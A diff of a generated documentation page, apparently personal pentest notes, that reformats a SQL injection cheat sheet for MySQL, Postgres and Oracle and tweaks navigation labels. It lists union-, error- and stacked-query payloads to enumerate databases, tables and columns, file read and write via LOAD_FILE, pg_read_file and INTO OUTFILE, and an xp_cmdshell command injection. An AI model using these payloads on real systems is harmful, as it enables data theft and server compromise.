@@ -1279,7 +1279,7 @@
           <li class="md-nav__item">
   <a href="#list-databases_1" class="md-nav__link">
     <span class="md-ellipsis">
-      List databases:
+      List databases
     </span>
   </a>
   
@@ -1288,7 +1288,7 @@
           <li class="md-nav__item">
   <a href="#list-tables_1" class="md-nav__link">
     <span class="md-ellipsis">
-      List Tables:
+      List Tables
     </span>
   </a>
   
@@ -1297,7 +1297,7 @@
           <li class="md-nav__item">
   <a href="#list-columns_1" class="md-nav__link">
     <span class="md-ellipsis">
-      List columns:
+      List columns
     </span>
   </a>
   
@@ -1339,7 +1339,7 @@
           <li class="md-nav__item">
   <a href="#list-databases_2" class="md-nav__link">
     <span class="md-ellipsis">
-      List databases:
+      List databases
     </span>
   </a>
   
@@ -2200,7 +2200,7 @@
   
   
   <span class="md-ellipsis">
-    Welcome to my Active Directory Notes
+    Under Construction
     
   </span>
   
@@ -4037,7 +4037,7 @@
           <li class="md-nav__item">
   <a href="#list-databases_1" class="md-nav__link">
     <span class="md-ellipsis">
-      List databases:
+      List databases
     </span>
   </a>
   
@@ -4046,7 +4046,7 @@
           <li class="md-nav__item">
   <a href="#list-tables_1" class="md-nav__link">
     <span class="md-ellipsis">
-      List Tables:
+      List Tables
     </span>
   </a>
   
@@ -4055,7 +4055,7 @@
           <li class="md-nav__item">
   <a href="#list-columns_1" class="md-nav__link">
     <span class="md-ellipsis">
-      List columns:
+      List columns
     </span>
   </a>
   
@@ -4097,7 +4097,7 @@
           <li class="md-nav__item">
   <a href="#list-databases_2" class="md-nav__link">
     <span class="md-ellipsis">
-      List databases:
+      List databases
     </span>
   </a>
   
@@ -4330,219 +4330,150 @@ Just like before, you will need to enable the privs first, sometimes they may be
 <div class="language-sql highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="s1">&#39;; EXEC xp_cmdshell &#39;</span><span class="n">your_command_here</span><span class="err">&#39;</span><span class="p">;</span><span class="w"> </span><span class="c1">--</span>
 </span></code></pre></div></p>
 <h2 id="mysql">MYSQL</h2>
-<h3 id="list-databases_1">List databases:</h3>
-<ul>
-<li>Normal<ul>
-<li><code>SHOW DATABASES;</code></li>
-</ul>
-</li>
-<li>Error based 32 character limit<ul>
-<li><code>' EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET 1)))--</code></li>
-</ul>
-</li>
-<li>Union Based<ul>
-<li><code>' UNION SELECT schema_name, NULL FROM information_schema.schemata --</code></li>
-</ul>
-</li>
-<li>Stacked Queries:<ul>
-<li><code>; SHOW DATABASES; --</code></li>
-</ul>
-</li>
-</ul>
-<h3 id="list-tables_1">List Tables:</h3>
-<ul>
-<li>Normal<ul>
-<li><code>SHOW TABLES;</code></li>
-</ul>
-</li>
-<li>Error based<ul>
-<li><code>' EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT table_name FROM information_schema.tables WHERE table_schema = 'database_name' LIMIT 1 OFFSET 1)))--</code></li>
-</ul>
-</li>
-<li>Union Based<ul>
-<li><code>' UNION SELECT TABLE_NAME, NULL FROM information_schema.tables WHERE table_schema = 'database_name' --</code></li>
-</ul>
-</li>
-<li>Stacked Queries:<ul>
-<li><code>; SHOW TABLES; --</code></li>
-</ul>
-</li>
-</ul>
-<h3 id="list-columns_1">List columns:</h3>
-<ul>
-<li>Normal<ul>
-<li><code>SHOW COLUMNS FROM table_name;</code></li>
-</ul>
-</li>
-<li>Error based<ul>
-<li><code>' EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT column_name FROM information_schema.columns WHERE table_name = 'table_name' LIMIT 1 OFFSET 1)))--</code></li>
-</ul>
-</li>
-<li>Union Based<ul>
-<li><code>' UNION SELECT COLUMN_NAME, NULL FROM information_schema.columns WHERE table_name = 'table_name' --</code></li>
-</ul>
-</li>
-<li>Stacked Queries:<ul>
-<li><code>; SHOW COLUMNS FROM table_name; --</code></li>
-</ul>
-</li>
-</ul>
-<h3 id="read-files">Read Files:</h3>
-<ul>
-<li>Normal<ul>
-<li><code>SELECT LOAD_FILE('/path/to/file');</code></li>
-</ul>
-</li>
-<li>SQLi<ul>
-<li><code>' UNION SELECT LOAD_FILE('/path/to/file'), NULL --</code></li>
-</ul>
-</li>
-</ul>
-<h3 id="write-files">Write Files:</h3>
-<ul>
-<li>Normal<ul>
-<li><code>SELECT * INTO OUTFILE '/path/to/file' FROM table_name;</code></li>
-</ul>
-</li>
-<li>SQLi<ul>
-<li><code>' UNION SELECT column_name FROM table_name INTO OUTFILE '/path/to/file' --</code></li>
-</ul>
-</li>
-</ul>
+<h4 id="list-databases_1">List databases</h4>
+<p>Normal
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="k">SHOW</span><span class="w"> </span><span class="n">DATABASES</span><span class="p">;</span>
+</span></code></pre></div></p>
+<p>Error based (32 character limit)
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="err">&#39;</span><span class="w"> </span><span class="n">EXTRACTVALUE</span><span class="p">(</span><span class="mi">0</span><span class="n">x0a</span><span class="p">,</span><span class="n">CONCAT</span><span class="p">(</span><span class="mi">0</span><span class="n">x0a</span><span class="p">,(</span><span class="k">SELECT</span><span class="w"> </span><span class="k">schema_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">schemata</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">OFFSET</span><span class="w"> </span><span class="mi">1</span><span class="p">)))</span><span class="c1">--</span>
+</span></code></pre></div>
+Union Based
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="err">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">schema_name</span><span class="p">,</span><span class="w"> </span><span class="k">NULL</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">schemata</span><span class="w"> </span><span class="c1">--</span>
+</span></code></pre></div>
+Stacked Queries:
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="p">;</span><span class="w"> </span><span class="k">SHOW</span><span class="w"> </span><span class="n">DATABASES</span><span class="p">;</span><span class="w"> </span><span class="c1">--</span>
+</span></code></pre></div></p>
+<h4 id="list-tables_1">List Tables</h4>
+<p>Normal
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="k">SHOW</span><span class="w"> </span><span class="n">TABLES</span><span class="p">;</span>
+</span></code></pre></div>
+Error based
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="s1">&#39; EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT table_name FROM information_schema.tables WHERE table_schema = &#39;</span><span class="n">database_name</span><span class="err">&#39;</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">OFFSET</span><span class="w"> </span><span class="mi">1</span><span class="p">)))</span><span class="c1">--</span>
+</span></code></pre></div></p>
+<p>Union Based
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="s1">&#39; UNION SELECT TABLE_NAME, NULL FROM information_schema.tables WHERE table_schema = &#39;</span><span class="n">database_name</span><span class="err">&#39;</span><span class="w"> </span><span class="c1">--</span>
+</span></code></pre></div>
+Stacked Queries:
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="p">;</span><span class="w"> </span><span class="k">SHOW</span><span class="w"> </span><span class="n">TABLES</span><span class="p">;</span><span class="w"> </span><span class="c1">--</span>
+</span></code></pre></div></p>
+<h4 id="list-columns_1">List columns</h4>
+<p>Normal
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="k">SHOW</span><span class="w"> </span><span class="n">COLUMNS</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span><span class="p">;</span>
+</span></code></pre></div>
+Error based
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="s1">&#39; EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT column_name FROM information_schema.columns WHERE table_name = &#39;</span><span class="k">table_name</span><span class="err">&#39;</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">OFFSET</span><span class="w"> </span><span class="mi">1</span><span class="p">)))</span><span class="c1">--</span>
+</span></code></pre></div></p>
+<p>Union Based
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="s1">&#39; UNION SELECT COLUMN_NAME, NULL FROM information_schema.columns WHERE table_name = &#39;</span><span class="k">table_name</span><span class="err">&#39;</span><span class="w"> </span><span class="c1">--</span>
+</span></code></pre></div>
+Stacked Queries:
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="p">;</span><span class="w"> </span><span class="k">SHOW</span><span class="w"> </span><span class="n">COLUMNS</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span><span class="p">;</span><span class="w"> </span><span class="c1">--</span>
+</span></code></pre></div></p>
+<h4 id="read-files">Read Files:</h4>
+<p>Normal
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">LOAD_FILE</span><span class="p">(</span><span class="s1">&#39;/path/to/file&#39;</span><span class="p">);</span>
+</span></code></pre></div>
+SQLi
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="s1">&#39; UNION SELECT LOAD_FILE(&#39;</span><span class="o">/</span><span class="n">path</span><span class="o">/</span><span class="k">to</span><span class="o">/</span><span class="n">file</span><span class="err">&#39;</span><span class="p">),</span><span class="w"> </span><span class="k">NULL</span><span class="w"> </span><span class="c1">--</span>
+</span></code></pre></div></p>
+<h4 id="write-files">Write Files:</h4>
+<p>Normal
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">OUTFILE</span><span class="w"> </span><span class="s1">&#39;/path/to/file&#39;</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span><span class="p">;</span>
+</span></code></pre></div>
+SQLi
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a><span class="s1">&#39; UNION SELECT column_name FROM table_name INTO OUTFILE &#39;</span><span class="o">/</span><span class="n">path</span><span class="o">/</span><span class="k">to</span><span class="o">/</span><span class="n">file</span><span class="err">&#39;</span><span class="w"> </span><span class="c1">--</span>
+</span></code></pre></div></p>
 <h2 id="postgres">Postgres</h2>
-<h3 id="list-databases_2">List databases:</h3>
-<ul>
-<li>Normal<ul>
-<li><code>SELECT datname FROM pg_database;</code></li>
-</ul>
-</li>
-<li>Error based<ul>
-<li><code>' (SELECT CAST((SELECT datname FROM pg_database LIMIT 1 OFFSET 1) AS integer))--</code></li>
-</ul>
-</li>
-<li>Union Based<ul>
-<li><code>' UNION SELECT datname, NULL FROM pg_database --</code></li>
-</ul>
-</li>
-<li>Stacked Queries:<ul>
-<li><code>; SELECT datname FROM pg_database; --</code></li>
-</ul>
-</li>
-</ul>
-<h3 id="list-tables_2">List Tables:</h3>
-<ul>
-<li>Normal<ul>
-<li><code>SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';</code></li>
-</ul>
-</li>
-<li>Error based<ul>
-<li><code>' (SELECT CAST((SELECT table_name FROM information_schema.tables WHERE table_schema = 'public' LIMIT 1 OFFSET 1) AS integer))--</code></li>
-</ul>
-</li>
-<li>Union Based<ul>
-<li><code>' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = 'public' --</code></li>
-</ul>
-</li>
-<li>Stacked Queries:<ul>
-<li><code>; SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'; --</code></li>
-</ul>
-</li>
-</ul>
-<h3 id="list-columns_2">List columns:</h3>
-<ul>
-<li>Normal<ul>
-<li><code>SELECT column_name FROM information_schema.columns WHERE table_name = 'table_name';</code></li>
-</ul>
-</li>
-<li>Error based<ul>
-<li><code>' (SELECT CAST((SELECT column_name FROM information_schema.columns WHERE table_name = 'table_name' LIMIT 1 OFFSET 1) AS integer))--</code></li>
-</ul>
-</li>
-<li>Union Based<ul>
-<li><code>' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'table_name' --</code></li>
-</ul>
-</li>
-<li>Stacked Queries:<ul>
-<li><code>; SELECT column_name FROM information_schema.columns WHERE table_name = 'table_name'; --</code></li>
-</ul>
-</li>
-</ul>
-<h3 id="read-files_1">Read Files:</h3>
-<ul>
-<li>Normal<ul>
-<li><code>SELECT pg_read_file('/path/to/file', 0, 1000000);</code></li>
-</ul>
-</li>
-<li>SQLi<ul>
-<li><code>' UNION SELECT pg_read_file('/path/to/file', 0, 1000000), NULL --</code></li>
-</ul>
-</li>
-</ul>
-<h3 id="write-files_1">Write Files:</h3>
-<ul>
-<li>Normal<ul>
-<li><code>COPY table_name TO '/path/to/file' DELIMITER ',' CSV HEADER;</code></li>
-</ul>
-</li>
-</ul>
+<h4 id="list-databases_2">List databases</h4>
+<p>Normal
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">datname</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">pg_database</span><span class="p">;</span>
+</span></code></pre></div>
+Error based
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="err">&#39;</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="k">CAST</span><span class="p">((</span><span class="k">SELECT</span><span class="w"> </span><span class="n">datname</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">pg_database</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">OFFSET</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="nb">integer</span><span class="p">))</span><span class="c1">--</span>
+</span></code></pre></div>
+Union Based
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a><span class="err">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">datname</span><span class="p">,</span><span class="w"> </span><span class="k">NULL</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">pg_database</span><span class="w"> </span><span class="c1">--</span>
+</span></code></pre></div>
+Stacked Queries
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a><span class="p">;</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">datname</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">pg_database</span><span class="p">;</span><span class="w"> </span><span class="c1">--</span>
+</span></code></pre></div></p>
+<h4 id="list-tables_2">List Tables:</h4>
+<p>Normal
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">table_schema</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;public&#39;</span><span class="p">;</span>
+</span></code></pre></div>
+Error based
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="s1">&#39; (SELECT CAST((SELECT table_name FROM information_schema.tables WHERE table_schema = &#39;</span><span class="k">public</span><span class="err">&#39;</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">OFFSET</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="nb">integer</span><span class="p">))</span><span class="c1">--</span>
+</span></code></pre></div>
+Union Based
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="s1">&#39; UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = &#39;</span><span class="k">public</span><span class="err">&#39;</span><span class="w"> </span><span class="c1">--</span>
+</span></code></pre></div>
+Stacked Queries:
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="p">;</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">table_schema</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;public&#39;</span><span class="p">;</span><span class="w"> </span><span class="c1">--</span>
+</span></code></pre></div></p>
+<h4 id="list-columns_2">List columns:</h4>
+<p>Normal
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">column_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;table_name&#39;</span><span class="p">;</span>
+</span></code></pre></div>
+Error based
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a><span class="s1">&#39; (SELECT CAST((SELECT column_name FROM information_schema.columns WHERE table_name = &#39;</span><span class="k">table_name</span><span class="err">&#39;</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">OFFSET</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="nb">integer</span><span class="p">))</span><span class="c1">--</span>
+</span></code></pre></div>
+Union Based
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a><span class="s1">&#39; UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = &#39;</span><span class="k">table_name</span><span class="err">&#39;</span><span class="w"> </span><span class="c1">--</span>
+</span></code></pre></div>
+Stacked Queries:
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a><span class="p">;</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">column_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;table_name&#39;</span><span class="p">;</span><span class="w"> </span><span class="c1">--</span>
+</span></code></pre></div></p>
+<h4 id="read-files_1">Read Files:</h4>
+<p>Normal
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">pg_read_file</span><span class="p">(</span><span class="s1">&#39;/path/to/file&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">1000000</span><span class="p">);</span>
+</span></code></pre></div>
+SQLi
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a><span class="s1">&#39; UNION SELECT pg_read_file(&#39;</span><span class="o">/</span><span class="n">path</span><span class="o">/</span><span class="k">to</span><span class="o">/</span><span class="n">file</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">1000000</span><span class="p">),</span><span class="w"> </span><span class="k">NULL</span><span class="w"> </span><span class="c1">--</span>
+</span></code></pre></div></p>
+<h4 id="write-files_1">Write Files:</h4>
+<p>Normal
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a><span class="k">COPY</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">TO</span><span class="w"> </span><span class="s1">&#39;/path/to/file&#39;</span><span class="w"> </span><span class="k">DELIMITER</span><span class="w"> </span><span class="s1">&#39;,&#39;</span><span class="w"> </span><span class="n">CSV</span><span class="w"> </span><span class="n">HEADER</span><span class="p">;</span>
+</span></code></pre></div></p>
 <h2 id="oracle">ORACLE</h2>
-<h3 id="list-databases_3">List databases:</h3>
-<ul>
-<li>Normal<ul>
-<li><code>SELECT name FROM v$database;</code></li>
-</ul>
-</li>
-<li>Error based<ul>
-<li><code>' AND (SELECT COUNT(*) FROM v$database) --</code></li>
-</ul>
-</li>
-<li>Union Based<ul>
-<li><code>' UNION SELECT name, NULL FROM v$database --</code></li>
-</ul>
-</li>
-<li>Stacked Queries:<ul>
-<li><code>; SELECT name FROM v$database; --</code></li>
-</ul>
-</li>
-</ul>
-<h3 id="list-tables_3">List Tables:</h3>
-<ul>
-<li>Normal<ul>
-<li><code>SELECT table_name FROM all_tables;</code></li>
-</ul>
-</li>
-<li>Error based<ul>
-<li><code>' AND (SELECT COUNT(*) FROM all_tables) --</code></li>
-</ul>
-</li>
-<li>Union Based<ul>
-<li><code>' UNION SELECT table_name, NULL FROM all_tables --</code></li>
-</ul>
-</li>
-<li>Stacked Queries:<ul>
-<li><code>; SELECT table_name FROM all_tables; --</code></li>
-</ul>
-</li>
-</ul>
-<h3 id="list-columns_3">List columns:</h3>
-<ul>
-<li>Normal<ul>
-<li><code>SELECT column_name FROM all_tab_columns WHERE table_name = 'table_name';</code></li>
-</ul>
-</li>
-<li>Error based<ul>
-<li><code>' AND (SELECT COUNT(*) FROM all_tab_columns WHERE table_name = 'table_name') --</code></li>
-</ul>
-</li>
-<li>Union Based<ul>
-<li><code>' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'table_name' --</code></li>
-</ul>
-</li>
-<li>Stacked Queries:<ul>
-<li><code>; SELECT column_name FROM all_tab_columns WHERE table_name = 'table_name'; --</code></li>
-</ul>
-</li>
-</ul>
+<h4 id="list-databases_3">List databases:</h4>
+<p>Normal
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">v$database</span><span class="p">;</span>
+</span></code></pre></div></p>
+<p>Error based
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a><span class="err">&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="k">COUNT</span><span class="p">(</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">v$database</span><span class="p">)</span><span class="w"> </span><span class="c1">--</span>
+</span></code></pre></div>
+Union Based
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a><span class="err">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="k">NULL</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">v$database</span><span class="w"> </span><span class="c1">--</span>
+</span></code></pre></div>
+Stacked Queries:
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a><span class="p">;</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">v$database</span><span class="p">;</span><span class="w"> </span><span class="c1">--</span>
+</span></code></pre></div></p>
+<h4 id="list-tables_3">List Tables:</h4>
+<p>Normal
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">all_tables</span><span class="p">;</span>
+</span></code></pre></div>
+Error based
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a><span class="err">&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="k">COUNT</span><span class="p">(</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">all_tables</span><span class="p">)</span><span class="w"> </span><span class="c1">--</span>
+</span></code></pre></div>
+Union Based
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a><span class="err">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">table_name</span><span class="p">,</span><span class="w"> </span><span class="k">NULL</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">all_tables</span><span class="w"> </span><span class="c1">--</span>
+</span></code></pre></div>
+Stacked Queries:
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a><span class="p">;</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">all_tables</span><span class="p">;</span><span class="w"> </span><span class="c1">--</span>
+</span></code></pre></div></p>
+<h4 id="list-columns_3">List columns:</h4>
+<p>Normal
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">column_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">all_tab_columns</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;table_name&#39;</span><span class="p">;</span>
+</span></code></pre></div>
+Error based
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a><span class="s1">&#39; AND (SELECT COUNT(*) FROM all_tab_columns WHERE table_name = &#39;</span><span class="k">table_name</span><span class="err">&#39;</span><span class="p">)</span><span class="w"> </span><span class="c1">--</span>
+</span></code></pre></div>
+Union Based
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a><span class="s1">&#39; UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = &#39;</span><span class="k">table_name</span><span class="err">&#39;</span><span class="w"> </span><span class="c1">--</span>
+</span></code></pre></div>
+Stacked Queries:
